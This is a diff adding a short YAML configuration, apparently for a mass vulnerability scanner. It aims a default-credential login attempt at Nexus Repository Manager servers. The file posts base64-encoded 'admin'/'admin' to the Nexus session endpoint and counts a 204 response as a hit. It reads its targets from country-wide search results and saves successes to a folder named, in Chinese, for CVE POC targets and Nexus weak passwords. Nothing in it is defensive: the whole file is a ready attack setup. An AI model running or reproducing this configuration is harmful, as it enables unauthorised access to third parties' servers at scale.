@@ -1,0 +1,15 @@
+targetPath: /service/rapture/session
+targetMethod: post
+targetTimeout: 2
+targetProfixs:
+    http: 127.0.0.1:7890
+targetAllowRedirects: false
+targetHeaders:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+targetJson:
+targetData: username=YWRtaW4%3D&password=YWRtaW4%3D
+targetReExpression:
+    respStatusCode: 204
+targetDir: ../countryQueryResult/
+targetOutputDir: ../2CVE漏洞POC目标/nexus弱口令/
+targetRestText: False
